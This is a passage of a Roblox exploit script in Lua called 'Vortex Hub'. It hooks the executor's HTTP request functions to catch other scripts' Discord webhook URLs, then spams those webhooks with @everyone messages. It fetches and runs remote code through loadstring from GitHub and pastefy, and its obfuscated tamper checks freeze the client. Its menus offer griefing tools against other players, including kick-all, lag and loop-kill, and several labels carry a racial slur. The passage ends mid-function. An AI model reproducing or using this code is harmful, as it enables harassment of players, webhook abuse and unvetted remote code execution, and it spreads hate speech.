local A={}A.s={type=type,tostring=tostring,pairs=pairs,pcall=pcall,print=print,error=error}function A.e()if not getgenv or not getgenv()then return false end local a=getgenv()return a==getgenv()end function A.f()for k,v in pairs(A.s)do if _G[k]and _G[k]~=v then return false end end return true end function A.d()if debug and debug.getinfo then local a,b=pcall(debug.getinfo,1)return a and b end return true end function A.v()local t={A="1",B="2",C="3"}for k,v in pairs(t)do if t[k]~=v then return false end end return true end for _,v in pairs({A.e,A.f,A.d,A.v})do if not v()then while true do task.wait()end end end

local player = game:GetService("Players").LocalPlayer
local requestFunc = request or http_request or (syn and syn.request)
local setclipboard = setclipboard or (syn and syn.write_clipboard)
if not requestFunc then
    return
end

local whitelist = {"no",}

local function isAllowed(url)
    url = url:lower()
    for _, allowed in ipairs(whitelist) do
        if url:find(allowed:lower(), 1, true) then
            return true
        end
    end
    return false
end

local function isWebhook(url)
    url = url:lower()
    if url:find("discord.com/api/webhooks") or url:find("webhook") then
        return true
    end
    local suspiciousUrls = {
        "ip-api.com/json",
        "api64.ipify.org/?format=json",
        "roblox.com/games",
        "roblox.com/users",
    }

    for _, suspicious in ipairs(suspiciousUrls) do
        if url:find(suspicious) then
            return true
        end
    end

    return false
end


local function showGUI(url)
    local gui = Instance.new("ScreenGui")
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 400, 0, 50)
    label.Position = UDim2.new(1, -410, 1, -60)
    label.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Text = "ウエブフックコピー\n" .. url
    label.TextWrapped = true
    label.TextScaled = true
    label.Font = Enum.Font.SourceSansBold
    label.Parent = gui

    task.delay(4, function()
        gui:Destroy()
    end)
end

local function sendMessageToWebhook(url)
    local http = game:GetService("HttpService")

    local lol = {  '@here@everyone ',
    ' https://tenor.com/view/yajuu-gif-25210528',
    ' https://tenor.com/view/inm-gif-14238283865225816154 ',
    ' https://tenor.com/view/%E9%87%8E%E7%8D%A3%E5%85%88%E8%BC%A9-gif-14710306075886469695',
    ' https://tenor.com/view/inmu-kmr-festival-%E6%B7%AB%E5%A4%A2-%E4%B8%8B%E5%8C%97%E6%B2%A2%E3%83%8A%E3%83%A1%E3%83%8A%E3%83%A1%E7%A5%AD%E3%82%8A-gif-25280542',
    ' https://tenor.com/view/%E9%87%8E%E7%8D%A3-%E9%87%8E%E7%8D%A3%E5%85%88%E8%BC%A9-gif-1590969839232724060',}

    spawn(function()
        while true do
            for _, msg in ipairs(lol) do
                local body = http:JSONEncode({
                    content = msg
                })

                local success, result = pcall(function()
                    return requestFunc({
                        Url = url,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = body
                    })
                end)

                if not success then
                    return
                end
                task.wait(2)
            end
        end
    end)
end

local function hookedRequest(tbl)
    if tbl and tbl.Url then
        local url = tbl.Url
        if isAllowed(url) then
            return requestFunc(tbl)
        end
        if isWebhook(url) then
            if setclipboard then
                pcall(function()
                    setclipboard(url)
                end)
            end
            showGUI(url)
            sendMessageToWebhook(url)
            return {
                Success = false,
                StatusCode = 403,
                Body = "Blocked"
            }
        end
    end
    return requestFunc(tbl)
end

getgenv().request = hookedRequest
getgenv().http_request = hookedRequest
if syn then
    syn.request = hookedRequest
end
local repo = "https://raw.githubusercontent.com/qvdc/Modified-Obsidian/main/"
local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()
local u = loadstring(game:HttpGet'https://pastefy.app/FJWfrz0i/raw')()
local GetPlayerCharacter = u.GetPlayerCharacter
local GetCharacter = u.GetCharacter
local PLCF = u.PLCF
local HRP = u.HRP
local Charrrrrr = u.Charrrrrr
local ROS = u.ROS
local lookAt = u.lookAt
local CNWOSHIPOPl = u.CNWOSHIPOPl
local GetLocalCharAndHum = u.GetLocalCharAndHum
local ROS = u.ROS
local LastTime = tick()
local Library = getgenv().Library
local Options = Library.Options
local Toggles = Library.Toggles

--main
local service=setmetatable({},{
	__index=function(self,k)
		local s=game:GetService(k)
		rawset(self,k,s)
		return s
	end,
})
local function VortexNotify(Message)
    Library:Notify({
        Title = "Vortex HUB",
        Description = Message,
        Duration = 4
    })
end
wait(2)

PLOT_MAP = {
    ["Purple-Plot"]  = "Plot3",
    ["Red-Plot"]     = "Plot2",
    ["Green-Plot"]   = "Plot1",
    ["Blue-Plot"]    = "Plot4",
    ["Chinese-Plot"] = "Plot5",
}

UseRemote = service.ReplicatedStorage.HoldEvents:WaitForChild("Use")
FurtherReachBoughtNotifier = service.ReplicatedStorage.GamepassEvents:WaitForChild("FurtherReachBoughtNotifier")
Struggle = service.ReplicatedStorage.CharacterEvents:WaitForChild("Struggle")
GameCorrectionsNotify = service.ReplicatedStorage.GameCorrectionEvents:WaitForChild("GameCorrectionsNotify")
RagdollRemote = service.ReplicatedStorage.CharacterEvents:WaitForChild("RagdollRemote")
CreateGrabLine  = service.ReplicatedStorage.GrabEvents:WaitForChild("CreateGrabLine")
DestroyGrabLine = service.ReplicatedStorage.GrabEvents:WaitForChild("DestroyGrabLine")
SetNetworkOwner = service.ReplicatedStorage.GrabEvents:WaitForChild("SetNetworkOwner")
ExtendGrabLine = service.ReplicatedStorage.GrabEvents:WaitForChild("ExtendGrabLine")
MenuToys = service.ReplicatedStorage:WaitForChild("MenuToys")
BuyToyRemoteFunction = MenuToys:WaitForChild("BuyToyRemoteFunction")
SpawnToyRemoteFunction = service.ReplicatedStorage.MenuToys:WaitForChild("SpawnToyRemoteFunction")
DestroyToy = MenuToys:WaitForChild("DestroyToy")
StickyPartEvent = service.ReplicatedStorage.PlayerEvents:WaitForChild("StickyPartEvent")
UpdateLineColorsEvent = service.ReplicatedStorage.DataEvents:WaitForChild("UpdateLineColorsEvent")
bombExplode = service.ReplicatedStorage.BombEvents:WaitForChild("BombExplode")

originalFallenHeight = service.Workspace.FallenPartsDestroyHeight
Camera = service.Workspace.CurrentCamera
local localPlayer = service.Players.LocalPlayer
Map = service.Workspace:FindFirstChild("Map")
SpawnedInToys = service.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
local inv = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys") or service.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
PlayerGui = localPlayer:WaitForChild("PlayerGui")
InOwnedPlot = localPlayer:WaitForChild("InOwnedPlot")
InPlot = localPlayer:WaitForChild("InPlot")
CanSpawnToy = localPlayer:WaitForChild("CanSpawnToy")
PlotItems = service.Workspace:FindFirstChild("PlotItems")
PlayerScripts = localPlayer:WaitForChild("PlayerScripts")
CharacterAndBeamMove = PlayerScripts:WaitForChild("CharacterAndBeamMove")
isHeld = localPlayer:WaitForChild("IsHeld")
AntiShuriLag = PlayerScripts:WaitForChild("StickyPartsTouchDetection")

local function sno(part)
    SetNetworkOwner:FireServer(part, part.CFrame)
end

local bringGui = Instance.new("ScreenGui")
bringGui.Name = "BringGui"
bringGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
bringGui.ResetOnSpawn = false
bringGui:SetAttribute("IsCustomScriptGui", true)
bringGui.Parent = PlayerGui

local bringButton = Instance.new("ImageButton")
bringButton.Name = "BringButton"
bringButton.Parent = bringGui
bringButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bringButton.BackgroundTransparency = 1.000
bringButton.BorderSizePixel = 0
bringButton.Position = UDim2.new(1, -449, 1, -80)
bringButton.Size = UDim2.new(0, 50, 0, 50)
bringButton.Image = "rbxassetid://97166444"
bringButton.ImageColor3 = Color3.fromRGB(142, 142, 142)
bringButton.ImageTransparency = 0.200

local bringLabel = Instance.new("ImageLabel")
bringLabel.Name = "BringLabel"
bringLabel.Parent = bringButton
bringLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bringLabel.BackgroundTransparency = 1.000
bringLabel.BorderSizePixel = 0
bringLabel.Position = UDim2.new(0.12, 0, 0.16, 0)
bringLabel.Size = UDim2.new(0.7, 0, 0.62, 2)
bringLabel.Image = "rbxassetid://130703864968637"
bringLabel.Visible = false   -- ★ 初期は非表示

local tpGui = Instance.new("ScreenGui")
tpGui.Name = "TpGui"
tpGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
tpGui.ResetOnSpawn = false
tpGui:SetAttribute("IsCustomScriptGui", true)
tpGui.Parent = PlayerGui

local tpButton = Instance.new("ImageButton")
tpButton.Name = "TpButton"
tpButton.Parent = tpGui
tpButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
tpButton.BackgroundTransparency = 1.000
tpButton.BorderSizePixel = 0
tpButton.Position = UDim2.new(1, -325, 1, -80)
tpButton.Size = UDim2.new(0, 50, 0, 50)
tpButton.Image = "rbxassetid://97166444"
tpButton.ImageTransparency = 0.200

local tpLabel = Instance.new("ImageLabel")
tpLabel.Name = "TpLabel"
tpLabel.Parent = tpButton
tpLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
tpLabel.BackgroundTransparency = 1.000
tpLabel.BorderSizePixel = 0
tpLabel.Size = UDim2.new(1, 0, 1, 0)
tpLabel.Image = "rbxassetid://126631801334895"
tpLabel.Visible = false

local palletGui = Instance.new("ScreenGui")
palletGui.Name = "PalletGui"
palletGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
palletGui.ResetOnSpawn = false
palletGui:SetAttribute("IsCustomScriptGui", true)
palletGui.Parent = PlayerGui

local palletButton = Instance.new("ImageButton")
palletButton.Name = "PalletButton"
palletButton.Parent = palletGui
palletButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
palletButton.BackgroundTransparency = 1.000
palletButton.BorderSizePixel = 0
palletButton.Position = UDim2.new(1, -387, 1, -80)
palletButton.Size = UDim2.new(0, 50, 0, 50)
palletButton.Image = "rbxassetid://97166444"
palletButton.ImageColor3 = Color3.fromRGB(142, 142, 142)
palletButton.ImageTransparency = 0.200

local palletLabel = Instance.new("ImageLabel")
palletLabel.Name = "PalletLabel"
palletLabel.Parent = palletButton
palletLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
palletLabel.BackgroundTransparency = 1.000
palletLabel.BorderSizePixel = 0
palletLabel.Position = UDim2.new(0.03, 0, 0, 0)
palletLabel.Size = UDim2.new(0.93, 0, 1, 2)
palletLabel.Image = "rbxassetid://77142072031982"
local function FWD(parent, part, timeout)
    return parent:FindFirstChild(part) or parent:WaitForChild(part, timeout or 3)
end
local function spawntoy(name, cframe, vector3)
    local inv = SpawnedInToys
    local toy = SpawnToyRemoteFunction:InvokeServer(table.unpack({
        [1] = name,
        [2] = cframe,
        [3] = vector3 or Vector3.zero
    }))
    local r = inv and inv[name]
    return r
end
local Config = {
    walkSpeed = 5,
    jumpPower = 24,
    spiderT = false,
    climbSpeed = 20,
	spiderCon = nil,
    fov = 70,
    deffov = 70,
    jumpConnection = nil,
    walkSpeedToggle = false,
    infiniteJumpToggle = false,
    fovToggle = false,
	spincconnn = nil,
	spinsp = 5,
    noclip = false,
    NoclipConnection = nil,
	kunaiMonitorConn = nil,

	AntigrabCon = nil,
	AntiGrabRag = false,
	AntigrabRGProc = false,
	AntigrabragWalk = false,
	AntigrabTPT = false,
    gucciRunId = 0,
    runId = 0,
    active = false,
    ragdollLoopActive = false,
    ragdollTask = nil,
    permRagActive = false,
    permRagTask = nil,
    setupDone = false,
    seatOccupied = false,
    monitoring = false,
    blobRef = nil,
    remoteRef = nil,
    tractorGucciT = false,
    tractorGucci2 = nil,
    tractorGucci3 = false,
    tractorGucci4 = nil,
    tractorGucci5 = {},
	autoatakka = false,
	AutoAttackerToggle = nil,
	SelectAutoatakka = "Death",
    autoBlobSitT = false,
    antiBlobKillActive = false,
    autoBlobSitTask = nil,
    antiBlobmanKillTask = nil,
    Blobkilltest = false,
	AntiblobauraCon = nil,
    BlobkilltestCon = nil,
    AntikillHouseT = false,
    AntiKillHouseCon = nil,
    antiKillHousePos = Vector3.new(-544.836304, -7.35040474, 77.8825378),
    IsBypassRun = false,
    lastOriginalCFrame = nil,
    cameraTargetPart = nil,
    antibananaSit = false,
    AntiragdollToggle = false,
	connections = {},
	charAddedConn = nil,
	AntiRagBlob = false,
	BlobRagdollSit = false,
    Antbananadest = false,
    Bananans = {},
    AntiBananaCon = {},
	paintPartsBackup = {},
	paintConnections = {},
    playerTag = nil,
    targetToy = "InstrumentGuitarBanjo",
    loopActive = false,
    runLoop = nil,
    respawnHandler = nil,
    spawnToyRemote = nil,
    destroyToyRemote = nil,
    CountLines = 0,
    LastLagS = nil,
    AutoAntiLag = false,
    AntiBurnndada = nil,
    AntiExplosionActive = false,
    AntiExplosionConnection = nil,
	antiStickyToggle = false,
    AutoTurnOnAntiKick = false,
    Contuuti = {},
	kickitemToggle = false,
	kickitemPCLD = nil,
	kickitemPCLDcon = nil,
	AntiKickToggle = false,
	AntikickT = false,
    AntikickResetToggle = false,
	AntikickLeaveToggle = false,
    PlayerListAnti = {},
    TargetAntigrabtpT = false,
    tpmode = "Grab",
    tpDrop = nil,

    PCLDBOX = {},
    PCLDToggle = false,
    blackHoleESP = false,
    BlackholeSelectionB = {},
    BlackholeBeam = {},
	BlackHoleConnection = nil,
    PCLDLine = Color3.fromRGB(0, 255, 255),
    PCLDSurface = Color3.fromRGB(0, 100, 255),
    PCLDFill = Color3.fromRGB(0, 0, 255),

    byte_thres = 5 * 1024,
    PacketCooldown = 30,
    lastPacketNotify = 0,
    PacketCon = {},
    JoinNotify = false,
    LeaveNotify = false,
    KickNotify = false,
    RecentKicked = {},
    KickConnection = nil,
	ClickTPKey = Enum.KeyCode.Z,
	BringKey = Enum.KeyCode.G,
    ClickTPfutuu = false,
    TPMode = "ClickTP",
    TPZcon = nil,
    TPZconall = nil,
    TPZholdCn = nil,
    holdtoggletp = false,
    TPZContro = nil,
    MobileTPDownCon = nil,
	MobileTPUpCon = nil,
	MobileTPLeaveCon = nil,
	MobileTPClickCon = nil,

	palletConn = nil,
    auraRadius = 600,
    SitAuraToggle = false,
    SitauraConnection = nil,
	auraThread = nil,
    spinSpeed = 150,
    spinAuraToggle = false,
    spinConnection = nil,
	TeleportAuraT = false,
	teleportBodie = {},
	teleportGyro = {},
	teleportCoro = nil,
    RagdollAuraToggle = false,
	BringAura = false,
    deathAuraToggle = false,
    deathConnection = nil,
    WhitelistFriends = false,
    spamkickaura = false,
    spamkickauralag = false,
    DoRagdoll = true,
    UsePallete = true,
    WhitelistFriends = false,
    LineLagEnabled = true,

	PStickyToggle = false,
	speedTractor = false,
	nitroActive = false,
	FireAllT = false,
    FireallWhitelist = true,
	RagdollAllT = false,
    RagdollallWhitelist = true,
    NiggerAllT = false,
    NiggerWhiteList = true,
	Killall = false,
	Kiclall = false,
    BringAllToggle = false,
    gewgsgvwe = true,
    floatConnection = nil,
    cameraAnchor = nil,
    originalCameraSubject = nil,
    freezePart = nil,
    WhitelistFriends2 = true,

    oopkillblob = false,
	PlayerList = {},
    aa6 = false,
    aa7 = nil,
    aa9 = 25,
    aa13 = false,
    aa15 = nil,
    aa17 = false,
    aa73 = nil,
    running = false,
    LastHouse = nil,
    LastPlotOwner = nil,
    HeightLimit = 10000,
    SpamkickblT = false,
    A1B2 = nil,
    C3D4 = nil,
    E5F6 = nil,
    G7H8 = nil,
    I9J0 = nil,
    BringMode = "GRAB",
	Loopkillblob = false,
	TarAntiAntikickWD = false,
    TarAntikickRoot = nil,
	FireLoop = false,
	BananaLoop = false,
    niggerLoop = false,
    PenKillT = false,
    PenKillTask = nil,
    LoopKillToggle = false,
    LoopKillTask = nil,

    blobAllT = false,
    Bloballmode = "Kill",
    bloballrun = false,
    bloballWhite = false,
    bloballWhitePlr = {},
	WhitelistFriendsBLOB = false,
    BlobauraM = "Kill",
    BlobauraT = false,
    BlobauraR = false,
	WalkspeedCont = 16,
	JumpPownerCont = 50,

    BLkickallWhite = false,
    BLKickallHeight = 14,
    BLSpreadRadius = 25,

    LineLagCoro = nil,
    LineLagToggle = false,
    WhitelistKickall = false,
    KickallHeight = 14,
    kickallRadius = 16,
    lineLagkickall = nil,
    lineLagConkickall = false,
    SelectedPlot = {"Purple-Plot"},
    plotBreakToggle = false,
    BleakPlotShuriken = {},
    savedPosition = nil,
    isTeleported = false,
	HouseTPauto = false,
    GameName = game.Name,
	Frames = 0,
	serverHopRejoin = 0
}

local function GetPlot()
    local plots = service.Workspace:FindFirstChild("Plots")
    if not plots then return end
    local folder = PLOT_MAP[Config.SelectedPlot]
    if folder then
        return plots:FindFirstChild(folder)
    end
end
local function IsPlayerInsideSafeZone(player)
    return player:FindFirstChild("InPlot") and player.InPlot.Value
end

local function CanAuraTarget(targetPlayer)
    if not targetPlayer or targetPlayer == localPlayer then return false end
    if not targetPlayer.Character then return false end
    if Config.WhitelistFriends and localPlayer:IsFriendsWith(targetPlayer.UserId) then
        return false
    end
    if table.find(kickAuraWhitelist or {}, targetPlayer.Name) then
        return false
    end
    local hum = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
    return hum and hum.Health > 0
end

local function FireAllwhite(p)
    if not Config.FireallWhitelist then
        return false
    end
    if not p or not p.UserId or not localPlayer then 
        return false 
    end
    local Friends = false
    pcall(function()
        Friends = localPlayer:IsFriendsWith(p.UserId)
    end)
    if Friends then 
        return true 
    end

    return false
end

local function ragdolallwhite(p)
    if not Config.RagdollallWhitelist then
        return false
    end
    if not p or not p.UserId or not localPlayer then 
        return false 
    end
    local Friends = false
    pcall(function()
        Friends = localPlayer:IsFriendsWith(p.UserId)
    end)
    if Friends then 
        return true 
    end

    return false
end

local function NiggerWhite(p)
    if not Config.NiggerWhiteList then
        return false
    end
    if not p or not p.UserId or not localPlayer then 
        return false 
    end
    local Friends = false
    pcall(function()
        Friends = localPlayer:IsFriendsWith(p.UserId)
    end)
    if Friends then 
        return true 
    end

    return false
end

local function BringWhite(Player)
    if Player == localPlayer then
        return true
    end
    if not Config.gewgsgvwe then
        return false
    end
    local success, isFriend = pcall(function()
        return localPlayer:IsFriendsWith(Player.UserId)
    end)
    if success and isFriend then
        return true
    end

    return false
end

local function Whiteall(player)
    if not Config.bloballWhite then 
        return false 
    end
    if player == localPlayer then 
        return true 
    end
    if localPlayer:IsFriendsWith(player.UserId) then 
        return true 
    end
    if Config.bloballWhitePlr[player.Name] then 
        return true 
    end
    return false
end

local function whitelistBlob(Player)
    if not Config.WhitelistFriendsBLOB then
        return false
    end
    if not Player or not Player.UserId then
        return false
    end
    if Player == localPlayer then
        return true
    end
    return localPlayer:IsFriendsWith(Player.UserId)
end

local function getAllPlayers()
    local players = {}
    for _, plr in pairs(service.Players:GetPlayers()) do
        if plr ~= localPlayer then table.insert(players, plr) end
    end
    return players
end

function isTargetable(player)
    if not player or player == localPlayer then return false end
    if Config.WhitelistKickall then
        local isFriend = false
        pcall(function()
            isFriend = localPlayer:IsFriendsWith(player.UserId)
        end)
        if isFriend then return false end
    end
    return true
end

local function NotifyAll(player, mode)
    if not player or player == localPlayer then return end
    if mode == "Join" and Config.JoinNotify then
        Library:Notify({
            Title = "Joined",
            Description = string.format("%s (ID:%s) joined the game.", player.DisplayName, player.Name),
            Duration = 5
        })
    elseif mode == "Leave" and Config.LeaveNotify then
        if Config.RecentKicked[player] then
            Config.RecentKicked[player] = nil
            return
        end
		if service.Workspace:FindFirstChild("BlackHoleKick") or (player.Character and player.Character:FindFirstChild("BlackHoleKick")) then
            return
        end
        Library:Notify({
            Title = "Left",
            Description = string.format("%s (ID:%s) left the game.", player.DisplayName, player.Name),
            Duration = 5
        })
    elseif mode == "Kick" and Config.KickNotify then
        Config.RecentKicked[player] = true
        Library:Notify({
            Title = "Kicked",
            Description = string.format("%s (ID:%s) has been kicked!", player.DisplayName, player.Name),
            Duration= 5
        })
        task.delay(10, function()
            Config.RecentKicked[player] = nil
        end)
    end
end

service.Players.PlayerAdded:Connect(function(player)
    NotifyAll(player, "Join")
end)

service.Players.PlayerRemoving:Connect(function(player)
    NotifyAll(player, "Leave")
end)

pcall(function()
    local productInfo = service.MarketplaceService:GetProductInfo(game.PlaceId)
    if productInfo and productInfo.Name then
        Config.GameName = productInfo.Name
    end
end)

local Window = Library:CreateWindow({
    Title = "Vortex Hub",
    Footer = "Project Vortex HUB | FTAP",
    Icon = 13639308918,
    NotifySide = "Right",
    ShowCustomCursor = true,
    EnableCompacting = true,
    SidebarCompacted = true,
    SearchbarSize = UDim2.fromScale(0.45, 1),
    CornerRadius = 30
})

ThemeManager:SetLibrary(Library)
ThemeManager:SetDefaultTheme({
	BackgroundColor = Color3.fromRGB(0, 0, 0),
    AccentColor = Color3.fromRGB(126, 126, 126),
    OutlineColor = Color3.fromRGB(30, 30, 30),
    FontColor = Color3.fromRGB(174, 174, 174),
    FontFace = "BuilderSans",
})

local Tabs = {
    infoTab = Window:AddTab("Info", "info"),
    PlayerTab = Window:AddTab("Local Player", "person-standing"),
    AntiTab = Window:AddTab("Defense", "shield"),
    Target = Window:AddTab("Target", "target"),
    BlobmanTab = Window:AddTab("Blobman", "skull"),
    ESPTab = Window:AddTab("ESP", "eye"),
    NotifyTab = Window:AddTab("Notify", "bell"),
	Keybinds = Window:AddTab("keybinds", "keyboard"),
    AuraTab = Window:AddTab("Aura", "sparkles"),
    MiscTab = Window:AddTab("Misc", "package"),
    ServerTab = Window:AddTab("Server", "server"),
    CreditsTab = Window:AddTab("Credits", "users"),
    UISettings = Window:AddTab("UISettings", "settings")
}

local Avatar = Tabs.infoTab:AddLeftGroupbox("Avatar")
local InfoLocal = Tabs.infoTab:AddRightGroupbox("local Info / Game Info")
local Ser = Tabs.infoTab:AddRightGroupbox("Rejoin / Join")
local LeftGroupBoxC = Tabs.PlayerTab:AddLeftGroupbox("Camera")
local MainLocal = Tabs.PlayerTab:AddLeftGroupbox("Main")
local ExtraLocal = Tabs.PlayerTab:AddRightGroupbox("Extra")
local Korblox = Tabs.PlayerTab:AddLeftGroupbox("Fake Korblox")
local LeftGroupBox = Tabs.AntiTab:AddLeftGroupbox("Main Defense")
local RightGroupBox = Tabs.AntiTab:AddRightGroupbox("Extra Defense")
local dadadadad = Tabs.AntiTab:AddLeftGroupbox("Target Defense")
local antikick = Tabs.AntiTab:AddRightGroupbox("Anti Kick")
local Targ = Tabs.Target:AddLeftGroupbox("Selct Target")
local spamde = Tabs.Target:AddLeftGroupbox("OwnerShip")
local Loop = Tabs.Target:AddLeftGroupbox("Grab")
local Loop2 = Tabs.Target:AddLeftGroupbox("LOOP")
local Bring = Tabs.Target:AddRightGroupbox("Bring")
local blobkill = Tabs.Target:AddLeftGroupbox("Blobman")
local DestroyGucci = Tabs.Target:AddRightGroupbox("Destroy Gucci")
local RemoveKickanti = Tabs.Target:AddLeftGroupbox("Remove Anti-Kick")
local Rei = Tabs.Target:AddRightGroupbox("Fling")
local aurabklaaaaao = Tabs.BlobmanTab:AddLeftGroupbox("Blobman All")
local aurabklo = Tabs.BlobmanTab:AddLeftGroupbox("Blobman Aura")
local SettingsDou = Tabs.BlobmanTab:AddRightGroupbox("Settings")
local Antikickesp = Tabs.ESPTab:AddLeftGroupbox("Anti-Kick ESP")
local PCES = Tabs.ESPTab:AddRightGroupbox("Player Character Location Detector")
local BL = Tabs.ESPTab:AddRightGroupbox("Black Hole")
local PlayersNotify = Tabs.NotifyTab:AddLeftGroupbox("Players")
local PackBl = Tabs.NotifyTab:AddRightGroupbox("Misc")
local Playa = Tabs.Keybinds:AddLeftGroupbox("keybinds")
local MainAura = Tabs.AuraTab:AddLeftGroupbox("Auras")
local kickaura = Tabs.AuraTab:AddRightGroupbox("KickAura")
local Stiyyyyyyyyyyyyyyyyy = Tabs.MiscTab:AddRightGroupbox("Pallet Sticky")
local miscOtherSec = Tabs.MiscTab:AddLeftGroupbox("Tractor")
local BBB = Tabs.MiscTab:AddRightGroupbox("Break Barrier")
local Freeeeeeeeee = Tabs.MiscTab:AddLeftGroupbox("Fire All")
local BananaAll = Tabs.MiscTab:AddRightGroupbox("Banana All")
local Nigger = Tabs.MiscTab:AddLeftGroupbox("Nigger All")
local BR = Tabs.MiscTab:AddRightGroupbox("Bring All")
local Lag = Tabs.ServerTab:AddLeftGroupbox("Line Lag")
local Groundkick = Tabs.ServerTab:AddLeftGroupbox("Ground Kick")
local KickallNoblob = Tabs.ServerTab:AddRightGroupbox("Blob Kickall")
local Breakiroiro = Tabs.ServerTab:AddLeftGroupbox("Plot Break")
local OOOOO = Tabs.ServerTab:AddLeftGroupbox("Claim-Plot")
local Dev = Tabs.CreditsTab:AddLeftGroupbox("Developer", "https://cdn.phototourl.com/free/2026-09-10-5c4f8876-4b73-4199-bee4-989287ed6aad.png")
local Dev2 = Tabs.CreditsTab:AddLeftGroupbox("Nigger")
local disc = Tabs.CreditsTab:AddRightGroupbox("Discord (test)", "https://cdn.phototourl.com/free/2026-09-10-6aece83a-8053-4537-8650-e70b237a854e.png")
local MenuGroup = Tabs.UISettings:AddLeftGroupbox("Menu")

Avatar:AddViewport("MyViewport", {
    Object = localPlayer.Character,
    Height = 300,
    Interactive = true,
    AutoFocus = true,
})
local StatsLabel = InfoLocal:AddLabel("FPS: 0 | Ping: 0ms")
local UserLabel = InfoLocal:AddLabel({
    Text = string.format("%s (ID: %s)", localPlayer.DisplayName, localPlayer.Name),
    Icon = "user",
})

local GameInfoLabel = InfoLocal:AddLabel({
    Text = string.format("%s (ID: %s)", Config.GameName, game.PlaceId),
    Icon = "gamepad-2",
})

Ser:AddButton({
    Text = "Rejoin",
    Func = function()
        if Config.serverHopRejoin == 0 then
            Config.serverHopRejoin = 1
            VortexNotify("Do you want to rejoin the game?")
        elseif Config.serverHopRejoin == 1 then
            Config.serverHopRejoin = 2
            VortexNotify("If you really want to rejoin, please press the button again.")
        elseif Config.serverHopRejoin == 2 then
            Config.serverHopRejoin = 0
            pcall(function()
                service.TeleportService:Teleport(game.PlaceId, service.Players.LocalPlayer)
            end)
        end
    end
})

Ser:AddButton({
    Text = "Server Hop",
    Func = function()
        if Config.serverHopRejoin == 0 then
            Config.serverHopRejoin = 1
            VortexNotify("Do you want to hop to another server?")
        elseif Config.serverHopRejoin == 1 then
            Config.serverHopRejoin = 2
            VortexNotify("If you really want to hop servers, please press the button again.")
        elseif Config.serverHopRejoin == 2 then
            Config.serverHopRejoin = 0
            pcall(function()
                local placeId = game.PlaceId
                local currentJobId = game.JobId
                local servers = service.HttpService:JSONDecode(
                    game:HttpGet("https://games.roblox.com/v1/places/" .. placeId .. "/servers/0?sortOrder=Asc&limit=100")
                )
                local targetServer = nil
                if servers and servers.data then
                    for _, server in ipairs(servers.data) do
                        if server.id ~= currentJobId and server.playing < server.maxPlayers then
                            targetServer = server.id
                            break
                        end
                    end
                end
                if targetServer then
                    service.TeleportService:TeleportToPlaceInstance(placeId, targetServer, service.Players.LocalPlayer)
                else
                    VortexNotify("Couldn't find another server, retrying standard teleport...")
                    service.TeleportService:Teleport(placeId, service.Players.LocalPlayer)
                end
            end)
        end
    end
})

LeftGroupBoxC:AddToggle("3rd", {
    Text = "Third Person",
    Default = false,
    Callback = function(Value)
        if Value then
            localPlayer.CameraMode = Enum.CameraMode.Classic
            Camera.CameraType = Enum.CameraType.Custom
            Camera.CameraSubject = localPlayer.Character:WaitForChild("Humanoid")
            localPlayer.CameraMaxZoomDistance = 16456456546
            localPlayer.CameraMinZoomDistance = 0.5
        else
            localPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
            Camera.CameraType = Enum.CameraType.Custom
            Camera.CameraSubject = localPlayer.Character:WaitForChild("Humanoid")
            localPlayer.CameraMaxZoomDistance = 0
            localPlayer.CameraMinZoomDistance = 0
        end
    end
})

LeftGroupBoxC:AddToggle("fovT", {
    Text = "Fov",
    Default = false,
    Callback = function(Value)
        Config.fovToggle = Value
        if Config.fovToggle then
            Camera.FieldOfView = Config.fov
        else
            Camera.FieldOfView = Config.deffov
        end
    end
})

LeftGroupBoxC:AddSlider("Fovdo", {
    Text = "Fov °",
    Min = 10,
    Max = 120,
    Default = Config.fov,
    Rounding = 1,
    Callback = function(Value)
        Config.fov = Value
        if Config.fovToggle then
            Camera.FieldOfView = Config.fov
        end
    end
})

MainLocal:AddToggle("Walkspeed", {
    Text = "Walk Speed",
    Default = false,
    Callback = function(Value)
        Config.walkSpeedToggle = Value
        task.spawn(function()
            while Config.walkSpeedToggle do
                local char = localPlayer.Character
                if char and char:FindFirstChild("Humanoid") and char:FindFirstChild("HumanoidRootPart") then
                    local hrp = char.HumanoidRootPart
                    local moveDir = char.Humanoid.MoveDirection
                    hrp.CFrame = hrp.CFrame + moveDir * (Config.walkSpeed / 10)
                end
                task.wait()
            end
            local char = localPlayer.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid.WalkSpeed = 16
            end
        end)
    end
})

MainLocal:AddSlider("walkspeeds", {
    Text = "Speed",
    Default = Config.walkSpeed,
    Min = 0,
    Max = 300,
    Rounding = 1,
    Callback = function(Value)
        Config.walkSpeed = Value
        local char = localPlayer.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.WalkSpeed = Value
        end
    end
})

MainLocal:AddToggle("infjump", {
    Text = "Infinite Jump",
    Default = false,
    Callback = function(Value)
        Config.infiniteJumpToggle = Value
        if Config.infiniteJumpToggle then
            if Config.jumpConnection then Config.jumpConnection:Disconnect() end
            Config.jumpConnection = service.UserInputService.JumpRequest:Connect(function()
                local char = localPlayer.Character
                local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
